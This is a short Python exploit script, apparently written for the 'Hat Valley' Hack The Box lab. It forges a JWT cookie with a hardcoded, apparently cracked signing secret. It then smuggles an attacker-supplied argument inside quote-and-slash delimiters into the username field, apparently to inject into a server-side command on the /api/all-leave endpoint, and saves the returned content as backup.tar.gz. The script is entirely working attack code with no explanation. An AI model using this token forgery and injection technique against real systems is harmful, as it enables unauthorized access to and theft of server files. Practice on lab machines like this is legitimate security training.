import requests
import jwt
import sys

secret = '123beany123'
username = f"/' {sys.argv[1]} '/"
token = jwt.encode({'username': username,  "iat": 1516239022}, secret, algorithm="HS256")

headers = {'Cookie': 'token=' +token}
r = requests.get('http://hat-valley.htb/api/all-leave',headers=headers)
with open("backup.tar.gz",'wb') as f:
    f.write(r.content)